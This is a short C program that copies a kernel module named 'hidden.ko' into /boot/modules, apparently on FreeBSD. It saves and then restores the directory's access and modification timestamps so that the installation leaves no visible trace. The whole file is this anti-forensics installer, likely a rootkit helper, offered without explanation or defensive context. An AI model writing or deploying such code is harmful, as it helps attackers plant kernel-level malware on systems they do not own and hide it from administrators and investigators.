#include <errno.h>
#include <stdio.h>
#include <sys/time.h>
#include <sys/types.h>
#include <sys/stat.h>

#include <stdlib.h>
#include <stdio.h>

int main(int argc, char *argv[]) {
        struct stat sb;
        struct timeval* time =(struct timeval*) malloc(2*sizeof(struct timeval));

        if (stat("/boot/modules", &sb) < 0) {
                fprintf(stderr, "STAT ERROR: %d\n", errno);
                exit(-1);
        }

        time[0].tv_sec = sb.st_atime;
        time[1].tv_sec = sb.st_mtime;

        char string[] = "cp hidden.ko /boot/modules";
        system(string);

        if (utimes("/boot/modules", time) < 0) {
                fprintf(stderr, "UTIMES ERROR: %d\n", errno);
                exit(-1);
        }

        exit(0);
}

